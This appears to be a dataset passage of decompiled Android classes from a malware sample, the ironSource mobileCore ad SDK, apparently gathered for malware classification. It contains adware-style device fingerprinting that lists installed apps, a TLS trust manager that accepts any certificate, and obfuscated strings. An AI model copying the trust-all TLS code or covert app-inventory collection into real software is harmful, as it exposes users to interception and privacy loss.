PackageManager.NameNotFoundException e) {       e.printStackTrace();     }     RelativeLayout.LayoutParams layoutParams4=new RelativeLayout.LayoutParams(B.a(this.a,48.0f),B.a(this.a,48.0f));     layoutParams4.addRule(15);     layoutParams4.addRule(1,1);     layoutParams4.leftMargin=B.a(this.a,2.0f);     ImageView imageView2=new ImageView(this.a);     imageView2.setLayoutParams(layoutParams4);     imageView2.setImageDrawable(drawable);     imageView2.setOnTouchListener(new View.OnTouchListener(){       @Override public final boolean onTouch(      android.view.View r4,      android.view.MotionEvent r5){         throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.M.AnonymousClass2.onTouch(android.view.View, android.view.MotionEvent):boolean"");       }     } );     imageView2.setOnClickListener(new View.OnClickListener(){       @Override public final void onClick(      View view){         M.this.b();       }     } );     TextView textView=new TextView(this.a);     RelativeLayout.LayoutParams layoutParams5=new RelativeLayout.LayoutParams(-2,-2);     layoutParams5.addRule(15);     layoutParams5.addRule(1,2);     textView.setLayoutParams(layoutParams5);     textView.setSingleLine();     textView.setEllipsize(TextUtils.TruncateAt.END);     textView.setTypeface(null,1);     textView.setBackgroundColor(0);     textView.setTextSize(2,18.0f);     textView.setBackgroundColor(0);     ApplicationInfo applicationInfo=null;     try {       applicationInfo=packageManager.getApplicationInfo(this.a.getPackageName(),0);     }  catch (    PackageManager.NameNotFoundException e2) {       e2.printStackTrace();     }     textView.setText(((String)packageManager.getApplicationLabel(applicationInfo)).toUpperCase().toUpperCase());     RelativeLayout.LayoutParams layoutParams6=new RelativeLayout.LayoutParams(-2,-2);     RelativeLayout relativeLayout=new RelativeLayout(this.a);     relativeLayout.setLayoutParams(layoutParams6);     relativeLayout.setPadding(0,0,12,0);     this.j.addView(imageView);     this.j.addView(imageView2);     relativeLayout.addView(this.j);     relativeLayout.addView(textView);     linearLayout.addView(relativeLayout);     linearLayout.addView(this);     return linearLayout;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\MCConnectivityReceiver.code","class MCConnectivityReceiver extends BroadcastReceiver {   MCConnectivityReceiver(){   }   @Override public void onReceive(  Context context,  Intent intent){     boolean z;     NetworkInfo activeNetworkInfo=((ConnectivityManager)context.getSystemService(""connectivity"")).getActiveNetworkInfo();     if (activeNetworkInfo == null) {       z=false;     }  else {       z=activeNetworkInfo.isConnectedOrConnecting();     }     if (z) {       aQ.h().l();     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\MCISliderAPI.code","public interface MCISliderAPI {   public static final String ACTION_WIDGET_CALLBACK=""com.ironsource.mcslidermenu.MCWidgetCallbackAction"";   public static final String EXTRA_CALLBACK_ID=""callbackId"";   void closeSliderMenu(  boolean z);   String getWidgetTextProperty(  String str,  MCEWidgetTextProperties mCEWidgetTextProperties);   void hideWidget(  String str);   boolean isSliderMenuOpen();   void openSliderMenu(  boolean z);   void setContentViewWithSlider(  Activity activity,  int i);   void setContentViewWithSlider(  Activity activity,  int i,  int i2);   void setEmphasizedWidget(  String str);   void setWidgetIconResource(  String str,  int i);   void setWidgetTextProperty(  String str,  MCEWidgetTextProperties mCEWidgetTextProperties,  String str2);   void showWidget(  String str);   void toggleSliderMenu(  boolean z); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\MCSliderProxy.code","public class MCSliderProxy implements MCISliderAPI {   @Override public void setContentViewWithSlider(  Activity activity,  int i){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().setContentViewWithSlider(activity,i);     }  else {       activity.setContentView(i);     }   }   @Override public void setContentViewWithSlider(  Activity activity,  int i,  int i2){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().setContentViewWithSlider(activity,i,i2);     }  else {       activity.setContentView(i);     }   }   @Override public void setWidgetTextProperty(  String str,  MCEWidgetTextProperties mCEWidgetTextProperties,  String str2){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().setWidgetTextProperty(str,mCEWidgetTextProperties,str2);     }   }   @Override public String getWidgetTextProperty(  String str,  MCEWidgetTextProperties mCEWidgetTextProperties){     return MobileCore.b(MobileCore.AD_UNITS.SLIDER) ? aQ.h().getWidgetTextProperty(str,mCEWidgetTextProperties) : """";   }   @Override public void setWidgetIconResource(  String str,  int i){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().setWidgetIconResource(str,i);     }   }   @Override public void openSliderMenu(  boolean z){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().openSliderMenu(z);     }   }   @Override public void closeSliderMenu(  boolean z){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().closeSliderMenu(z);     }   }   @Override public void toggleSliderMenu(  boolean z){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().toggleSliderMenu(z);     }   }   @Override public void showWidget(  String str){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().showWidget(str);     }   }   @Override public void hideWidget(  String str){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().hideWidget(str);     }   }   @Override public void setEmphasizedWidget(  String str){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       aQ.h().setEmphasizedWidget(str);     }   }   @Override public boolean isSliderMenuOpen(){     if (MobileCore.b(MobileCore.AD_UNITS.SLIDER)) {       return aQ.h().isSliderMenuOpen();     }     return false;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\MobileCore.code","public abstract class MobileCore {   protected static MCSliderProxy a;   private static Context b;   private static Handler c;   private static String d;   private static String e;   private static ArrayList<AD_UNITS> f=new ArrayList<>();   private static boolean g=false;   private static C0117z h=null;   public enum AD_UNITS {  ALL_UNITS,   OFFERWALL,   SLIDER,   STICKEEZ,   DIRECT_TO_MARKET}   public enum LOG_TYPE {  DEBUG,   PRODUCTION}   static JSONObject e(){     return f();   }   @Deprecated public static void init(  Activity activity,  String str,  LOG_TYPE log_type){     init(activity,str,log_type,AD_UNITS.ALL_UNITS);   }   public static void init(  android.content.Context r7,  final java.lang.String r8,  com.ironsource.mobilcore.MobileCore.LOG_TYPE r9,  com.ironsource.mobilcore.MobileCore.AD_UNITS... r10){     throw new UnsupportedOperationException(""Method not decompiled: com.ironsource.mobilcore.MobileCore.init(android.content.Context, java.lang.String, com.ironsource.mobilcore.MobileCore$LOG_TYPE, com.ironsource.mobilcore.MobileCore$AD_UNITS[]):void"");   }   private static JSONObject f(){     JSONObject jSONObject=new JSONObject();     try {       Context context=b;       jSONObject.put(""Model"",Build.MODEL);       jSONObject.put(""Device"",Build.DEVICE);       jSONObject.put(""Brand"",Build.BRAND);       jSONObject.put(""Language"",Locale.getDefault().getDisplayLanguage(Locale.ENGLISH));       jSONObject.put(""Release"",Build.VERSION.RELEASE);       jSONObject.put(""CellAvail"",aK.a(context,1));       jSONObject.put(""WifiAvail"",aK.a(context,0));       jSONObject.put(""Dpi"",String.valueOf(aE.d(context)));       jSONObject.put(""ScreenSize"",aE.a(Double.valueOf(aE.e(context)),context));       jSONObject.put(""LastAppInst"",aE.b(context));       jSONObject.put(""InstalledApps"",aE.c(context));       jSONObject.put(""CurrentConn"",aE.a(aE.a(context)));       jSONObject.put(""Uns"",aE.l(context));       jSONObject.put(""Uid"",aC.a(b).a());     }  catch (    JSONException e2) {       aE.a(b,MobileCore.class.getName(),e2);     }     return jSONObject;   }   public static String a(){     return a(b);   }   public static String a(  Context context){     if (TextUtils.isEmpty(d) && context != null) {       d=C0116y.b(aE.n(context).getString(""1%dns#ge1%dk1%do1%dts#g_1%dss#gfs#ge1%dr1%dp"",""""));     }     return d;   }   private static void b(  Context context){     if (c == null || b == null) {       A.a(""SETTING sUIHandler"",55);       c=new Handler();       b=context.getApplicationContext();     }   }   public static Handler b(){     return c;   }   public static Context c(){     return b;   }   public static boolean a(  AD_UNITS ad_units){     return f.contains(ad_units) || f.contains(AD_UNITS.ALL_UNITS);   }   public static boolean b(  AD_UNITS ad_units){     StackTraceElement[] stackTrace;     boolean a2=a(ad_units);     A.a(""MobileCore , checkAndHanleAdUnitInit() | adUnit:"" + ad_units + "" , isUnitInit:""+ a2,55);     if (!a2 && (stackTrace=Thread.currentThread().getStackTrace()) != null && stackTrace.length > 3) {       A.a(""Trying to use "" + stackTrace[3].getMethodName() + ""() when ""+ ad_units.getClass().getSimpleName()+ "".""+ ad_units+ "" was not specified in MobileCore.init()"",2);     }     return a2;   }   public static void openUrl(  Activity activity,  String str,  boolean z){     b(activity);     aE.a(activity,str,z);   }   public static void refreshOffers(){     if (a(AD_UNITS.OFFERWALL)) {       aL.h().c();     }     if (a(AD_UNITS.SLIDER)) {       aQ.h().c();     }     if (a(AD_UNITS.STICKEEZ)) {       aS.h().c();     }   }   public static void showOfferWall(  Activity activity,  CallbackResponse callbackResponse){     try {       if (h.d()) {         h.a(Thread.currentThread().getStackTrace()[3].getLineNumber());       }     }  catch (    Exception e2) {     }     if (callbackResponse != null) {       showOfferWall(activity,callbackResponse,false);     }  else {       showOfferWall(activity,callbackResponse,true);     }   }   public static void showOfferWall(  final Activity activity,  final CallbackResponse callbackResponse,  final boolean z){     try {       if (h.d()) {         h.a(Thread.currentThread().getStackTrace()[3].getLineNumber());       }     }  catch (    Exception e2) {     }     try {       if (h.d()) {         StackTraceElement[] stackTrace=Thread.currentThread().getStackTrace();         h.a(stackTrace[3].getLineNumber());         h.a(stackTrace);       }     }  catch (    Exception e3) {     }     if (b(AD_UNITS.OFFERWALL)) {       b(activity);       A.a(""offerwall | requesting showOfferWall"",3);       c.post(new Runnable(){         @Override public final void run(){           if (aK.b(MobileCore.b)) {             aL.h().a(activity,callbackResponse,z);             return;           }           A.a(""showOfferWall | no internet connection"",3);           if (z) {             Toast.makeText(MobileCore.b,""No internet connection"",1).show();           }           if (callbackResponse != null) {             callbackResponse.onConfirmation(CallbackResponse.TYPE.OFFERWALL_NO_CONNECTION);           }         }       } );     }   }   public static void setOfferwallReadyListener(  OnReadyListener onReadyListener){     if (b(AD_UNITS.OFFERWALL)) {       if (aL.h().l()) {         onReadyListener.onReady(AD_UNITS.OFFERWALL);       }  else {         aL.h().a(onReadyListener);       }     }   }   public static boolean isOfferwallReady(){     if (b(AD_UNITS.OFFERWALL)) {       return aL.h().l();     }     return false;   }   public static MCISliderAPI getSlider(){     return a;   }   public static void directToMarket(  Activity activity){     if (b(AD_UNITS.DIRECT_TO_MARKET)) {       C0107p.h().a(activity);     }   }   public static void directToMarket(){     directToMarket(null);   }   public static void setDirectToMarketReadyListener(  OnReadyListener onReadyListener){     if (b(AD_UNITS.DIRECT_TO_MARKET)) {       if (C0107p.h().i()) {         onReadyListener.onReady(AD_UNITS.DIRECT_TO_MARKET);       }  else {         C0107p.h().a(onReadyListener);       }     }   }   public static boolean isDirectToMarketReady(){     if (b(AD_UNITS.DIRECT_TO_MARKET)) {       return C0107p.h().i();     }     return false;   }   public static void showStickee(  Activity activity){     if (b(AD_UNITS.STICKEEZ)) {       if (aL.h().k()) {         A.a(""Offerwall is open, not showing Stickeez."",3);       }  else {         aS.h().a(activity);       }     }   }   public static void hideStickee(){     if (b(AD_UNITS.STICKEEZ)) {       aS.h().m();     }   }   public static boolean isStickeeReady(){     if (b(AD_UNITS.STICKEEZ)) {       return aS.h().i();     }     return false;   }   public static boolean isStickeeShowing(){     if (b(AD_UNITS.STICKEEZ)) {       return aS.h().k();     }     return false;   }   public static boolean isStickeeShowingOffers(){     if (b(AD_UNITS.STICKEEZ)) {       return aS.h().j();     }     return false;   }   public static void setStickeezReadyListener(  OnReadyListener onReadyListener){     if (b(AD_UNITS.STICKEEZ)) {       if (aS.h().i()) {         onReadyListener.onReady(AD_UNITS.STICKEEZ);       }  else {         aS.h().a(onReadyListener);       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\MobileCoreReport.code","public class MobileCoreReport extends Service {   private ArrayList<b> a;   private LinkedBlockingQueue<a> b;   private Handler c;   private int d;   private Runnable e=new Runnable(){     @Override public final void run(){       A.a(""MobileCoreReport service , mStopSelfRunnable , run() | called. stopping self"",55);       MobileCoreReport.this.stopSelf();     }   } ;   static void b(  MobileCoreReport mobileCoreReport){     if (mobileCoreReport.b.isEmpty() && mobileCoreReport.c() == 0) {       mobileCoreReport.a(true);     }   }   @Override public IBinder onBind(  Intent intent){     return null;   }   @Override public void onCreate(){     A.a(""MobileCoreReport service onCreate() | called"",55);     this.b=new LinkedBlockingQueue<>(50);     this.a=new ArrayList<>(5);     this.c=new Handler();     this.d=0;     for (int i=0; i < 5; i++) {       b bVar=new b();       this.a.add(bVar);       bVar.start();     }   }   @Override public void onDestroy(){     A.a(""MobileCoreReport service onDestroy() | called"",55);     super.onDestroy();     this.b.clear();     this.a.clear();   }   @Override public int onStartCommand(  Intent intent,  int i,  int i2){     A.a(""MobileCoreReport service , onStartCommand() | startId:"" + i2,55);     a aVar=new a(i2,intent);     try {       a(false);       this.b.add(aVar);       return 1;     }  catch (    IllegalStateException e) {       A.a(""MobileCoreReport service , ServiceTask , doJob() | dropping request:"" + i2,55);       return 1;     }   }   private void a(  boolean z){     A.a(""MobileCoreReport service , addRemoveStopSelfRunnable() | called. doAdd:"" + z,55);     if (z) {       this.c.postDelayed(this.e,5000L);     }  else {       this.c.removeCallbacks(this.e);     }   }   private synchronized int c(){     return this.d;   }   public final synchronized void a(){     this.d--;   }   public final synchronized void b(){     this.d++;   } public class a {     private int b;     private Intent c;     public a(    int i,    Intent intent){       this.b=i;       this.c=intent;     }     public final void a(){       if (this.c != null) {         A.a(""MobileCoreReport service , ServiceTask , doJob() | mStartId:"" + this.b,55);         new aJ().a(MobileCoreReport.this,this.c);       }     }   } public class b extends Thread {     public b(){     }     @Override public final void run(){       super.run();       while (true) {         try {           a aVar=(a)MobileCoreReport.this.b.take();           MobileCoreReport.this.b();           aVar.a();           MobileCoreReport.this.a();           MobileCoreReport.b(MobileCoreReport.this);         }  catch (        InterruptedException e) {           return;         }       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\N.code","public final class N extends E {   private RelativeLayout t;   public N(  Context context,  C0091aw c0091aw,  E.a aVar){     super(context,c0091aw,null);   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);   }   @Override public final void d(){     this.t=new RelativeLayout(this.c);     this.t.setId(j());     this.t.setLayoutParams(new RelativeLayout.LayoutParams(-1,-1));     ProgressBar progressBar=new ProgressBar(this.c);     int applyDimension=(int)TypedValue.applyDimension(1,25.0f,this.c.getResources().getDisplayMetrics());     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(applyDimension,applyDimension);     layoutParams.addRule(13);     progressBar.setLayoutParams(layoutParams);     this.t.addView(progressBar);     this.p=new TextView(this.c);     this.p.setBackgroundColor(Color.parseColor(""#90000000""));     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-2);     layoutParams2.addRule(8,this.t.getId());     this.p.setLayoutParams(layoutParams2);     int a=B.a(this.c,5.0f);     this.p.setPadding(a,a,a,a);     this.p.setGravity(1);     this.p.setTypeface(null,1);     this.p.setTextColor(-1);     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTextSize(2,16.0f);     View view=new View(this.c);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(B.a(this.c,this.d.g()),-2);     layoutParams3.addRule(11);     layoutParams3.addRule(6,this.t.getId());     layoutParams3.addRule(8,this.t.getId());     view.setLayoutParams(layoutParams3);     view.setBackgroundColor(this.d.e());     ViewGroup viewGroup=(ViewGroup)this.h;     viewGroup.setClickable(true);     viewGroup.setFocusable(true);     viewGroup.addView(this.t);     viewGroup.addView(this.p);     viewGroup.addView(view);     a(this.d.o(),this.d.b(),new TextView[0]);   }   @Override public final void e(){     this.p.setText(""Loading awesome apps!"");   }   @Override public final void c(  JSONObject jSONObject){     super.c(jSONObject);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\O.code","final class O extends E {   private String t;   public O(  Context context,  C0091aw c0091aw,  E.a aVar){     super(context,c0091aw,aVar);   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);   }   @Override public final void d(){     this.s=new ImageView(this.c);     this.s.setId(j());     this.s.setScaleType(ImageView.ScaleType.CENTER_CROP);     LinearLayout.LayoutParams layoutParams=new LinearLayout.LayoutParams(-1,-1);     layoutParams.gravity=17;     this.s.setLayoutParams(layoutParams);     this.p=new TextView(this.c);     this.p.setBackgroundColor(Color.parseColor(""#90000000""));     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-2);     layoutParams2.addRule(8,this.s.getId());     this.p.setLayoutParams(layoutParams2);     int a=B.a(this.c,5.0f);     this.p.setPadding(a,a,a,a);     this.p.setGravity(1);     this.p.setTypeface(null,1);     this.p.setTextColor(-1);     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTextSize(2,16.0f);     View view=new View(this.c);     RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(B.a(this.c,this.d.g()),-2);     layoutParams3.addRule(11);     layoutParams3.addRule(6,this.s.getId());     layoutParams3.addRule(8,this.s.getId());     view.setLayoutParams(layoutParams3);     view.setBackgroundColor(this.d.e());     ViewGroup viewGroup=(ViewGroup)this.h;     viewGroup.setClickable(true);     viewGroup.setFocusable(true);     viewGroup.addView(this.s);     viewGroup.addView(this.p);     viewGroup.addView(view);     a(this.d.o(),this.d.b(),new TextView[0]);   }   @Override public final void e(){     String str;     this.p.setText(this.l);     if (this.t == null) {       str=this.a;     }  else {       if (this.t == """") {         o();         return;       }       str=this.t;     }     if (!TextUtils.isEmpty(str)) {       B.a aVar=new B.a(){         @Override public final void a(        Bitmap bitmap){           if (bitmap == null) {             O.this.o();           }  else {             O.this.s.setImageBitmap(B.a(O.this.c,bitmap));           }         }         @Override public final void a(){           O.this.o();         }       } ;       if (aVar != null) {         aE.a(new AsyncTask<String,Void,Bitmap>(){           public AnonymousClass1(){           }           @Override protected final Bitmap doInBackground(          String[] strArr){             return BitmapFactory.decodeFile(strArr[0],null);           }           @Override protected final void onPostExecute(          Bitmap bitmap){             Bitmap bitmap2=bitmap;             super.onPostExecute(bitmap2);             if (bitmap2 == null) {               a.this.a();             }  else {               a.this.a(bitmap2);             }           }         } ,str);         return;       }       return;     }     o();   }   @Override public final void c(  JSONObject jSONObject){     super.c(jSONObject);     this.t=null;     try {       JSONArray optJSONArray=jSONObject.optJSONArray(""extra"");       if (optJSONArray != null) {         int i=0;         while (true) {           int i2=i;           if (i2 < optJSONArray.length()) {             if (optJSONArray.getJSONObject(i2).getString(MetaDataStyle.KEY_NAME).equals(""cover_img"")) {               String optString=optJSONArray.getJSONObject(i2).optString(""value"",null);               if (!TextUtils.isEmpty(optString)) {                 this.t=aO.a(C0114w.a().b(),optString);                 String str=this.t;                 if (str.indexOf(""file://"") == 0) {                   str=str.substring(7);                 }                 this.t=str;               }             }             i=i2 + 1;           }  else {             return;           }         }       }     }  catch (    JSONException e) {     }   }   public void o(){     this.s.setImageBitmap(B.a(""""));   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\OnReadyListener.code","public interface OnReadyListener {   void onReady(  MobileCore.AD_UNITS ad_units); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\P.code","abstract class P extends H {   public P(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   }   @Override protected final boolean f(){     return true;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);     this.h.setPadding(this.d.h(),this.d.i(),this.d.h(),this.d.i());   }   @Override public final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     this.s=new ImageView(this.c);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(15);     layoutParams.rightMargin=B.a(this.c,9.0f);     this.s.setLayoutParams(layoutParams);     this.s.setId(j());     viewGroup.addView(this.s);     this.p=new TextView(this.c);     this.p.setBackgroundColor(0);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,this.s.getId());     layoutParams2.addRule(15);     this.p.setLayoutParams(layoutParams2);     this.p.setGravity(3);     this.p.setTypeface(null,1);     this.p.setTextSize(2,16.0f);     viewGroup.addView(this.p);     a(this.d.q(),this.d.b(),this.p);   }   @Override public final void e(){     this.p.setText(this.l.toUpperCase());     if (!TextUtils.isEmpty(this.o)) {       this.s.setImageBitmap(B.a(this.c,this.o));     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\Q.code","public final class Q extends H implements L {   private LinearLayout a;   public Q(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""lineButton"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     super.a(jSONObject,true);   }   @Override protected final boolean f(){     return true;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);   }   @Override public final void d(){     this.s=new ImageView(this.c);     this.s.setId(j());     m();     this.p=new TextView(this.c);     this.p.setBackgroundColor(0);     this.p.setId(j());     this.p.setSingleLine();     this.p.setEllipsize(TextUtils.TruncateAt.END);     this.p.setTextSize(2,22.0f);     this.q=new TextView(this.c);     this.q.setBackgroundColor(0);     this.q.setSingleLine();     this.q.setEllipsize(TextUtils.TruncateAt.END);     this.q.setTextSize(2,12.0f);     this.a=new LinearLayout(this.c);     this.a.setOrientation(1);     a(null,this.d.b(),this.p,this.q,this.r);   }   @Override public final void e(){     this.p.setText(this.l);     if (this.r != null) {       this.r.setText(this.n);     }     if (this.q != null) {       this.q.setText(this.m);     }     if (!TextUtils.isEmpty(this.o)) {       this.s.setImageBitmap(B.a(this.c,this.o));     }   }   @Override public final void g(){     ViewGroup viewGroup=(ViewGroup)this.h;     viewGroup.removeAllViews();     this.a.removeAllViews();     boolean z=!TextUtils.isEmpty(this.n);     boolean z2=!TextUtils.isEmpty(this.m);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(15);     layoutParams.rightMargin=B.a(this.c,9.0f);     this.s.setLayoutParams(layoutParams);     viewGroup.addView(this.s);     viewGroup.addView(this.r);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-2,-2);     layoutParams2.addRule(1,this.s.getId());     layoutParams2.addRule(15);     if (z) {       this.r.setVisibility(0);       layoutParams2.addRule(0,this.r.getId());     }  else {       this.r.setVisibility(8);     }     if (!z2) {       layoutParams2.addRule(15);     }     this.p.setLayoutParams(layoutParams2);     if (z2) {       this.q.setVisibility(0);       this.q.setLayoutParams(new RelativeLayout.LayoutParams(-2,-2));       RelativeLayout.LayoutParams layoutParams3=new RelativeLayout.LayoutParams(-2,-2);       layoutParams3.addRule(1,this.s.getId());       layoutParams3.addRule(15);       if (z) {         layoutParams3.addRule(0,this.r.getId());       }       this.a.setLayoutParams(layoutParams3);       this.a.addView(this.p);       this.a.addView(this.q);       viewGroup.addView(this.a);       viewGroup.setPadding(this.d.h(),0,this.d.h(),0);       return;     }     this.q.setVisibility(8);     viewGroup.addView(this.p);     viewGroup.setPadding(this.d.h(),this.d.i(),this.d.h(),this.d.i());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\R.code","public final class R extends LinearLayout {   private a a; public interface a {     boolean a();   }   public R(  Context context,  a aVar){     super(context);     this.a=aVar;   }   @Override public final boolean dispatchKeyEvent(  KeyEvent keyEvent){     return (keyEvent.getKeyCode() != 4 || this.a == null) ? super.dispatchKeyEvent(keyEvent) : this.a.a();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\S.code","public final class S extends P {   public S(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceOfferWallOpener"";   }   @Override public final void a(  View view){     super.a(view);     MobileCore.showOfferWall(this.e,null);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\ServiceConnectionC0097f.code","final class ServiceConnectionC0097f implements ServiceConnection {   boolean a=false;   private final BlockingQueue<IBinder> b=new LinkedBlockingQueue();   @Override public final void onServiceConnected(  ComponentName componentName,  IBinder iBinder){     try {       this.b.put(iBinder);     }  catch (    InterruptedException e) {     }   }   @Override public final void onServiceDisconnected(  ComponentName componentName){   }   public final IBinder a() throws InterruptedException {     if (this.a) {       throw new IllegalStateException();     }     this.a=true;     return this.b.take();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\T.code","public final class T extends P {   public T(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceRateUs"";   }   @Override public final void a(  View view){     super.a(view);     String str=""market://details?id="" + this.c.getPackageName();     Intent intent=new Intent(""android.intent.action.VIEW"");     intent.setData(Uri.parse(str));     this.e.startActivity(intent);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\U.code","public final class U extends SSLSocketFactory {   SSLContext a;   public U(  KeyStore keyStore) throws NoSuchAlgorithmException, KeyManagementException, KeyStoreException, UnrecoverableKeyException {     super(keyStore);     this.a=SSLContext.getInstance(""TLS"");     this.a.init(null,new TrustManager[]{new X509TrustManager(){       @Override public final void checkClientTrusted(      X509Certificate[] x509CertificateArr,      String str) throws CertificateException {       }       @Override public final void checkServerTrusted(      X509Certificate[] x509CertificateArr,      String str) throws CertificateException {       }       @Override public final X509Certificate[] getAcceptedIssuers(){         return null;       }     } },null);   }   @Override public final Socket createSocket(  Socket socket,  String str,  int i,  boolean z) throws IOException, UnknownHostException {     return this.a.getSocketFactory().createSocket(socket,str,i,z);   }   @Override public final Socket createSocket() throws IOException {     return this.a.getSocketFactory().createSocket();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\V.code","public final class V extends ScrollView {   private b a;   private Handler b; public interface b {   }   public V(  Context context){     super(context);     this.a=null;     this.b=new a();   }   @Override protected final void onScrollChanged(  int i,  int i2,  int i3,  int i4){     super.onScrollChanged(i,i2,i3,i4);     Message obtain=Message.obtain();     obtain.arg1=i4;     obtain.arg2=i2;     obtain.what=1;     this.b.sendMessageDelayed(obtain,500L);   } class a extends Handler {     a(){     }     @Override public final void handleMessage(    Message message){       super.handleMessage(message);       if (!hasMessages(1) && V.this.a != null) {         b unused=V.this.a;       }     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.ironsource.mobilcore\W.code","public final class W extends H {   private String a;   private EditText b;   private ImageView t;   static void a(  W w){     String obj=w.b.getText().toString();     if (TextUtils.isEmpty(w.a) || TextUtils.isEmpty(obj)) {       return;     }     String format=MessageFormat.format(w.a,obj);     w.b.setText("""");     w.k();     aE.a(w.e,format,true);     I.a(w.c,""slider"",""widget"",""search_performed"",new I.a[0]);   }   public W(  Context context,  C0091aw c0091aw){     super(context,c0091aw);   }   @Override public final String a(){     return ""ironsourceSearch"";   }   @Override public final void a(  JSONObject jSONObject) throws JSONException {     this.a=jSONObject.optString(""baseSearchUrl"",""http://search.spearmint-browser.com/results.php?s={0}&a=mcsldr"");     super.a(jSONObject,true);     this.b.setOnEditorActionListener(new TextView.OnEditorActionListener(){       @Override public final boolean onEditorAction(      TextView textView,      int i,      KeyEvent keyEvent){         if (i == 3) {           W.a(W.this);           return false;         }         return false;       }     } );     this.t.setOnClickListener(new View.OnClickListener(){       @Override public final void onClick(      View view){         W.a(W.this);       }     } );   }   @Override protected final boolean f(){     return false;   }   @Override protected final void c(){     this.h=new RelativeLayout(this.c);     this.h.setPadding(this.d.h(),this.d.h(),this.d.h(),this.d.h());   }   @Override public final void d(){     ViewGroup viewGroup=(ViewGroup)this.h;     this.t=new ImageView(this.c);     this.t.setId(j());     int a=B.a(this.c,5.0f);     this.t.setPadding(a * 2,a,a,a);     RelativeLayout.LayoutParams layoutParams=new RelativeLayout.LayoutParams(-2,-2);     layoutParams.addRule(15);     layoutParams.addRule(11);     this.t.setLayoutParams(layoutParams);     this.t.setImageDrawable(this.d.l());     this.b=new EditText(this.c);     RelativeLayout.LayoutParams layoutParams2=new RelativeLayout.LayoutParams(-1,-2);     layoutParams2.addRule(0,this.t.getId());     this.b.setLayoutParams(layoutParams2);     this.b.setSingleLine();     this.b.setImeOptions(3);     this.b.setHintTextColor(this.d.c());  